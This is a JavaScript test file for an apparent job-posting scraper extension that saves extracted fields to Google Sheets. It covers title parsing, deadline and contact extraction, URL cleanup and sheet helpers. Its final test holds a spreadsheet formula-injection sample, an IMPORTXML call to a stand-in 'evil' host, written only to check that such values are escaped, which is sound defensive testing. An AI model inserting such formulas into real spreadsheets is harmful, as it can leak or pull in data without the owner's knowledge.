import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';

import { extractAll, keywordSearch, findDate, parseTitle, cleanUrl } from '../lib/extract.js';
import { autoMap, defaultRule, planColumns, STANDARD_HEADERS, DEFAULT_WANTED } from '../lib/rules.js';
import { parseSpreadsheetId, columnLetter } from '../lib/storage.js';
import { neutralizeFormula, parseRowNumber, quoteTab, planHeaderWrites } from '../background/sheets.js';

const fixture = (name) => JSON.parse(readFileSync(new URL(`./fixtures/${name}.json`, import.meta.url), 'utf8'));
const NOW = new Date(2026, 10, 7); // 2026-11-07

function run(page, types) {
  const columns = types.map((type, index) => ({ index, header: type, rule: defaultRule(type) }));
  return Object.fromEntries(extractAll(columns, page, NOW).map((c) => [c.header, c]));
}

test('LinkedIn-style posting: title parsing, inline labels, prose contact', () => {
  const r = run(fixture('linkedin-like'), ['jobTitle', 'company', 'deadline', 'contact', 'location', 'salary', 'url', 'dateSaved']);
  assert.equal(r.jobTitle.value, 'Software Engineering Intern');
  assert.equal(r.company.value, 'Acme Robotics'); // not "a leader in..." and not og:site_name "LinkedIn"
  assert.equal(r.company.source, 'page title');
  assert.equal(r.deadline.value, 'March 15, 2026');
  assert.equal(r.deadline.source, 'page text');
  assert.equal(r.contact.value, 'Jane Doe (jane.doe@acme-robotics.com)');
  assert.equal(r.location.value, 'New York, NY');
  assert.equal(r.salary.value, '$40/hr - $50/hr.');
  assert.equal(r.url.value, 'https://www.linkedin.com/jobs/view/1234567890/');
  assert.equal(r.dateSaved.value, '2026-11-07');
});

test('ATS posting: JSON-LD JobPosting plus label/value on separate lines', () => {
  const r = run(fixture('greenhouse-like'), ['jobTitle', 'company', 'deadline', 'contact', 'location', 'salary', 'published']);
  assert.equal(r.jobTitle.value, 'Data Analyst');
  assert.equal(r.jobTitle.source, 'structured data');
  assert.equal(r.company.value, 'Globex Corporation');
  assert.equal(r.deadline.value, 'April 1, 2026'); // page text wins over validThrough
  assert.equal(r.contact.value, 'Maria Lopez');
  assert.equal(r.location.value, 'Austin, TX, US'); // no "Location" label in the text -> JSON-LD address
  assert.equal(r.salary.value, '85,000–105,000 USD per year');
  assert.equal(r.published.value, '2026-02-01');
});

test('Research paper: citation meta tags', () => {
  const r = run(fixture('paper-like'), ['pageTitle', 'authors', 'abstract', 'published']);
  assert.equal(r.pageTitle.value, '[2511.01234] Sparse Attention for Long Documents');
  assert.equal(r.authors.value, 'Smith, John; Doe, Jane');
  assert.match(r.abstract.value, /^We propose a sparse attention mechanism/);
  assert.equal(r.published.value, '2025-11-03');
});

test('Nothing found: fields stay empty, metadata fields still fill', () => {
  const r = run(fixture('empty'), ['company', 'deadline', 'contact', 'url', 'dateSaved', 'blank']);
  assert.equal(r.deadline.value, '');
  assert.equal(r.deadline.source, null);
  assert.equal(r.contact.value, '');
  assert.equal(r.blank.value, '');
  assert.equal(r.url.value, 'https://example.com/');
  assert.equal(r.dateSaved.value, '2026-11-07');
});

test('Custom keyword and regex rules', () => {
  const page = fixture('greenhouse-like');
  const columns = [
    { index: 0, header: 'Req', rule: { type: 'regex', pattern: 'Requisition ID:\\s*(\\S+)' } },
    { index: 1, header: 'Req2', rule: { type: 'keyword', keywords: ['Requisition ID'], valueKind: 'text' } },
    { index: 2, header: 'Bad', rule: { type: 'regex', pattern: '([' } },
  ];
  const [a, b, c] = extractAll(columns, page, NOW);
  assert.equal(a.value, 'R-20931');
  assert.equal(b.value, 'R-20931');
  assert.equal(c.value, '');
  assert.equal(c.error, 'Invalid regex');
});

test('User-edited keywords override preset keywords', () => {
  const page = { text: 'Final date to submit: June 2, 2026', meta: {}, jsonld: [] };
  const columns = [{ index: 0, header: 'Due', rule: { type: 'deadline', keywords: ['Final date to submit'] } }];
  assert.equal(extractAll(columns, page, NOW)[0].value, 'June 2, 2026');
});

test('Selected text is searched before the rest of the page', () => {
  const page = { text: 'Deadline: May 1, 2026', selection: 'Deadline: June 9, 2026', meta: {}, jsonld: [] };
  const [d] = extractAll([{ index: 0, header: 'D', rule: defaultRule('deadline') }], page, NOW);
  assert.equal(d.value, 'June 9, 2026');
});

test('keywordSearch: prose-y kinds require a label layout', () => {
  assert.equal(keywordSearch(['Our company is a leader in robotics.'], ['Company'], 'name'), '');
  assert.equal(keywordSearch(['Company: Initech'], ['Company'], 'name'), 'Initech');
  assert.equal(keywordSearch(['Company', 'Initech LLC'], ['Company'], 'name'), 'Initech LLC');
  // Date-shaped values are allowed in prose.
  assert.equal(keywordSearch(['Please apply by 12/01/2026 for priority review.'], ['Apply by'], 'date'), '12/01/2026');
  // "Contact us" is not a person.
  assert.equal(keywordSearch(['Contact us'], ['Contact'], 'person'), '');
});

test('findDate formats', () => {
  assert.equal(findDate('closes 2026-03-04 at noon'), '2026-03-04');
  assert.equal(findDate('the 3rd of March, 2026'), '3 March, 2026');
  assert.equal(findDate('Sept. 9'), 'Sept. 9');
  assert.equal(findDate('by March 2026'), 'March 2026');
  assert.equal(findDate('no date here'), '');
});

test('parseTitle patterns', () => {
  assert.deepEqual(parseTitle('Acme hiring Designer in Remote | LinkedIn'), { company: 'Acme', role: 'Designer' });
  assert.deepEqual(parseTitle('Job Application for PM at Initech'), { role: 'PM', company: 'Initech' });
  assert.deepEqual(parseTitle('Backend Engineer - Platform | Hooli Careers'), { role: 'Backend Engineer', company: 'Hooli' });
  assert.deepEqual(parseTitle('Careers'), { role: '', company: '' });
});

test('autoMap maps common headers', () => {
  const t = (h) => autoMap(h).type;
  assert.equal(t('Company'), 'company');
  assert.equal(t('Role'), 'jobTitle');
  assert.equal(t('Apply By'), 'deadline');
  assert.equal(t('Application Deadline'), 'deadline');
  assert.equal(t('Recruiter'), 'contact');
  assert.equal(t('Date Posted'), 'published');
  assert.equal(t('Date Saved'), 'dateSaved');
  assert.equal(t('Job Link'), 'url');
  assert.equal(t('Status'), 'blank');
  assert.equal(t(''), 'blank');
  assert.deepEqual(autoMap('Deadline').keywords.slice(0, 2), ['Application Deadline', 'Deadline']);
});

test('Sheet helpers', () => {
  assert.equal(
    parseSpreadsheetId('https://docs.google.com/spreadsheets/d/1AbC_dEf-123456789012345678/edit#gid=0'),
    '1AbC_dEf-123456789012345678'
  );
  assert.equal(parseSpreadsheetId('https://example.com'), null);
  assert.equal(parseRowNumber("'My Tab'!A42:F42"), 42);
  assert.equal(parseRowNumber('Sheet1!A7:C7'), 7);
  assert.equal(quoteTab("Bob's jobs"), "'Bob''s jobs'");
  assert.equal(columnLetter(0), 'A');
  assert.equal(columnLetter(27), 'AB');
});

test('Saved links drop tracking parameters but keep meaningful ones', () => {
  assert.equal(
    cleanUrl('https://jobs.lever.co/acme/123?utm_source=linkedin&utm_campaign=x&lever-origin=applied'),
    'https://jobs.lever.co/acme/123?lever-origin=applied'
  );
  assert.equal(
    cleanUrl('https://www.linkedin.com/jobs/view/42/?refId=abc&trackingId=def&trk=public'),
    'https://www.linkedin.com/jobs/view/42/'
  );
  assert.equal(cleanUrl('https://boards.greenhouse.io/x/jobs/1?gh_src=abc&gh_jid=1'), 'https://boards.greenhouse.io/x/jobs/1?gh_jid=1');
  assert.equal(cleanUrl('https://example.com/a#section'), 'https://example.com/a#section');
  assert.equal(cleanUrl('chrome://extensions'), 'chrome://extensions');
  assert.equal(cleanUrl(''), '');
  const page = { url: 'https://example.com/job?id=7&fbclid=zz', text: '', meta: {}, jsonld: [] };
  assert.equal(extractAll([{ index: 0, header: 'Link', rule: autoMap('Link') }], page, NOW)[0].value, 'https://example.com/job?id=7');
});

test('planHeaderWrites: matches existing headers, appends missing ones after the last cell', () => {
  const current = ['Company', '', 'apply by', 'Notes'];
  const plan = planHeaderWrites(current, ['company', 'Apply By', 'Link', 'Date Saved', 'link']);
  assert.deepEqual(plan.positions, [0, 2, 4, 5, 4]); // case-insensitive; duplicate names share a column
  assert.deepEqual(plan.created, [4, 5]);
  assert.deepEqual(plan.headers, ['Company', '', 'apply by', 'Notes', 'Link', 'Date Saved']);
  // Blank cells are never matched, even for an empty name.
  assert.deepEqual(planHeaderWrites([''], ['Link']).positions, [1]);
  // Empty sheet: everything is created starting at column A.
  assert.deepEqual(planHeaderWrites([], ['Company', 'Role']).created, [0, 1]);
});

test('planColumns: adds pending standard columns that are not mapped yet', () => {
  const col = (index, header) => ({ index, header, rule: autoMap(header) });
  // Existing sheet with Company + Apply By (mapped to deadline) + a blank cell at index 2.
  const planned = planColumns([col(0, 'Company'), col(1, 'Apply By')], DEFAULT_WANTED, 3);
  const pending = planned.filter((c) => c.pending);
  assert.deepEqual(
    pending.map((c) => [c.index, c.header, c.rule.type]),
    [
      [3, 'Role', 'jobTitle'],
      [4, 'Contact', 'contact'],
      [5, 'Link', 'url'],
      [6, 'Date Saved', 'dateSaved'],
    ]
  );
  // Empty sheet gets every default column, starting at A, in a sensible order.
  assert.deepEqual(
    planColumns([], DEFAULT_WANTED, 0).map((c) => c.header),
    ['Company', 'Role', 'Deadline', 'Contact', 'Link', 'Date Saved']
  );
  // Unticking a field drops its pending column; re-planning keeps keyword edits on the others.
  pending[0].rule.keywords = ['Opening'];
  const replanned = planColumns(planned, DEFAULT_WANTED.filter((t) => t !== 'contact'), 3);
  assert.ok(!replanned.some((c) => c.header === 'Contact'));
  assert.deepEqual(replanned.find((c) => c.header === 'Role').rule.keywords, ['Opening']);
  // A column already named "Link" but mapped to "blank" by the user is respected (no duplicate).
  const userBlank = { index: 0, header: 'Link', rule: { type: 'blank' } };
  assert.ok(!planColumns([userBlank], ['url'], 1).some((c) => c.pending));
  // Every standard header auto-maps back to its own rule, so a reload links them correctly.
  for (const [type, header] of Object.entries(STANDARD_HEADERS)) assert.equal(autoMap(header).type, type, header);
});

test('Formula injection is neutralized, plain numbers are not', () => {
  assert.equal(neutralizeFormula('=IMPORTXML("http://evil")'), `'=IMPORTXML("http://evil")`);
  assert.equal(neutralizeFormula('@foo'), "'@foo");
  assert.equal(neutralizeFormula('-5'), '-5');
  assert.equal(neutralizeFormula('+1,000'), '+1,000');
  assert.equal(neutralizeFormula('Acme'), 'Acme');
});
